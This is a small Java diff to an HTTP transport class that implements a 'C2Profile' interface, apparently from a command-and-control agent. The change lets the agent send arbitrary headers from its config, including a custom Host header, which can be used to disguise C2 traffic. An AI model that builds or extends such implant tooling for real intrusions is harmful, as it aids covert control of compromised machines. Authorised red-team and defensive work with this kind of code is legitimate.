@@ -28,7 +28,16 @@ public class HttpProfile implements C2Profile {
         Config.debugLog(config, "HTTP POST to: " + url);
         
         HttpPost post = new HttpPost(url);
-        post.setHeader("User-Agent", config.getUserAgent());
+        
+        // Set all headers from config (includes User-Agent and any custom headers like Host)
+        java.util.Map<String, String> headers = config.getHeaders();
+        if (headers != null) {
+            for (java.util.Map.Entry<String, String> header : headers.entrySet()) {
+                post.setHeader(header.getKey(), header.getValue());
+                Config.debugLog(config, "Setting header: " + header.getKey() + ": " + header.getValue());
+            }
+        }
+        
         post.setHeader("Content-Type", "application/json");
         post.setEntity(new StringEntity(data));
         
